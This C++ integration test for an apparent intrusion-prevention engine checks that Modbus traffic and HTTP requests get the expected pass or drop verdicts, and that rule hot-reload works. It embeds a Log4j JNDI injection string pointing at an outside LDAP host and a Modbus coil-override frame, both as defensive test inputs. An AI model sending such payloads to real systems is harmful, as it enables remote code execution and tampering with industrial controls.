// Save as: examples/05_test_extensibility_engine.cpp
#include <iostream>
#include <chrono>
#include <thread>
#include <cassert>
#include <cstring>
#include "sdk/PluginSupervisor.hpp"

using namespace sentinel::sdk;

// Mock host callbacks
static void mock_log(int level, const char* sender, const char* msg) {
    const char* lvl_str[] = {"DEBUG", "INFO", "WARN", "ERROR"};
    std::cout << "[" << lvl_str[level] << "] (" << sender << ") " << msg << std::endl;
}

static int mock_drop_ipv4(uint32_t ipv4, uint32_t dur) {
    std::cout << "[MOCK KERNEL] Drop rule issued for IP " << ipv4 << " duration " << dur << "s" << std::endl;
    return 0;
}

static void mock_emit_metric(const char* name, uint64_t val) {
    std::cout << "[MOCK METRIC] " << name << " += " << val << std::endl;
}

static uint64_t mock_time_ns() {
    return std::chrono::duration_cast<std::chrono::nanoseconds>(
        std::chrono::steady_clock::now().time_since_epoch()).count();
}

int main() {
    std::cout << "============================================================" << std::endl;
    std::cout << "   SENTINEL EXTENSIBILITY SUBSYSTEM INTEGRATION TEST        " << std::endl;
    std::cout << "============================================================" << std::endl;

    SentinelHostInterface host{};
    host.engine_version = 10000;
    host.log_message = mock_log;
    host.request_ebpf_drop_ip = mock_drop_ipv4;
    host.emit_metric_counter = mock_emit_metric;
    host.get_monotonic_time_ns = mock_time_ns;

    PluginSupervisor supervisor(host, "/etc/sentinel/plugins.d", "/etc/sentinel/rules.d");

    if (!supervisor.initialize()) {
        std::cerr << "[-] Failed to initialize supervisor!" << std::endl;
        return 1;
    }

    std::cout << "[+] Supervisor initialized. Native plugins: " 
              << supervisor.native_loader().active_plugin_count()
              << " | Lua rules: " << supervisor.lua_engine().active_rule_count() 
              << std::endl;

    // -------------------------------------------------------------
    // TEST 1: Modbus FC01 Read (Legitimate Traffic -> Verdict PASS)
    // -------------------------------------------------------------
    uint8_t modbus_read[] = {
        0x00, 0x01,             // Transaction ID
        0x00, 0x00,             // Protocol ID (Modbus)
        0x00, 0x06,             // Length
        0x01,                   // Unit ID
        0x01,                   // FC 01: Read Coils
        0x00, 0x10, 0x00, 0x05  // Start address 16, count 5
    };

    SentinelRawPacket pkt1{};
    pkt1.data = modbus_read;
    pkt1.length = sizeof(modbus_read);
    pkt1.timestamp_ns = mock_time_ns();

    auto t0 = std::chrono::high_resolution_clock::now();
    SentinelDissectorResult res1 = supervisor.evaluate_frame(pkt1);
    auto t1 = std::chrono::high_resolution_clock::now();
    auto ns1 = std::chrono::duration_cast<std::chrono::nanoseconds>(t1 - t0).count();

    std::cout << "\n[TEST 1] Legitimate Modbus Read -> Verdict: " 
              << res1.verdict << " (Latency: " << ns1 << " ns)" << std::endl;
    assert(res1.verdict == SENTINEL_VERDICT_PASS);

    // -------------------------------------------------------------
    // TEST 2: Native C++ Dissector: Modbus FC05 (Illegal Write -> DROP)
    // -------------------------------------------------------------
    uint8_t modbus_write[] = {
        0x00, 0x02,             // Transaction ID
        0x00, 0x00,             // Protocol ID (Modbus)
        0x00, 0x06,             // Length
        0x01,                   // Unit ID
        0x05,                   // FC 05: Force Single Coil (OVERRIDE)
        0x00, 0x10, 0xFF, 0x00  // Coil 16 = ON
    };

    SentinelRawPacket pkt2{};
    pkt2.data = modbus_write;
    pkt2.length = sizeof(modbus_write);
    pkt2.timestamp_ns = mock_time_ns();

    t0 = std::chrono::high_resolution_clock::now();
    SentinelDissectorResult res2 = supervisor.evaluate_frame(pkt2);
    t1 = std::chrono::high_resolution_clock::now();
    auto ns2 = std::chrono::duration_cast<std::chrono::nanoseconds>(t1 - t0).count();

    std::cout << "[TEST 2] Modbus Coil Override -> Verdict: " << res2.verdict
              << " (" << res2.threat_name << ") | Latency: " << ns2 << " ns" << std::endl;
    assert(res2.verdict == SENTINEL_VERDICT_KERNEL_DROP);

    // -------------------------------------------------------------
    // TEST 3: LuaJIT Rule: Log4j Exploit Payload -> DROP
    // -------------------------------------------------------------
    const char log4j_payload[] = "GET /?user=${jndi:ldap://10.240.0.99:1389/Exploit} HTTP/1.1\r\nHost: 10.240.0.10\r\n\r\n";

    SentinelRawPacket pkt3{};
    pkt3.data = reinterpret_cast<const uint8_t*>(log4j_payload);
    pkt3.length = std::strlen(log4j_payload);
    pkt3.timestamp_ns = mock_time_ns();

    t0 = std::chrono::high_resolution_clock::now();
    SentinelDissectorResult res3 = supervisor.evaluate_frame(pkt3);
    t1 = std::chrono::high_resolution_clock::now();
    auto ns3 = std::chrono::duration_cast<std::chrono::nanoseconds>(t1 - t0).count();

    std::cout << "[TEST 3] Log4j JNDI Exploit -> Verdict: " << res3.verdict
              << " (" << res3.threat_name << ") | Latency: " << ns3 << " ns" << std::endl;
    assert(res3.verdict == SENTINEL_VERDICT_KERNEL_DROP);

    // -------------------------------------------------------------
    // TEST 4: Live Hot-Reload Verification (inotify)
    // -------------------------------------------------------------
    std::cout << "\n[TEST 4] Testing dynamic zero-downtime hot-reload via inotify..." << std::endl;
    uint64_t gen_before = supervisor.lua_engine().current_generation();

    // Dynamically touch / add a new rule file to trigger inotify
    FILE* fp = fopen("/etc/sentinel/rules.d/300_threat_test_canary.lua", "w");
    if (fp) {
        fputs("Rule = { id = 9999, name = 'CANARY_DYNAMIC_RULE', port = 0 }\n", fp);
        fputs("function Rule.inspect(pkt) return 0 end\n", fp);
        fclose(fp);
    }

    // Wait 300ms for inotify event loop to process
    std::this_thread::sleep_for(std::chrono::milliseconds(300));
    uint64_t gen_after = supervisor.lua_engine().current_generation();

    std::cout << "[+] Generation shifted: " << gen_before << " -> " << gen_after 
              << " (Active rules: " << supervisor.lua_engine().active_rule_count() << ")" << std::endl;
    assert(gen_after > gen_before);

    // Clean up temporary canary
    std::remove("/etc/sentinel/rules.d/300_threat_test_canary.lua");

    std::cout << "\n============================================================" << std::endl;
    std::cout << " [SUCCESS] All 4 Extensibility & Mitigation Tests Passed!   " << std::endl;
    std::cout << "============================================================" << std::endl;

    supervisor.shutdown();
    return 0;
}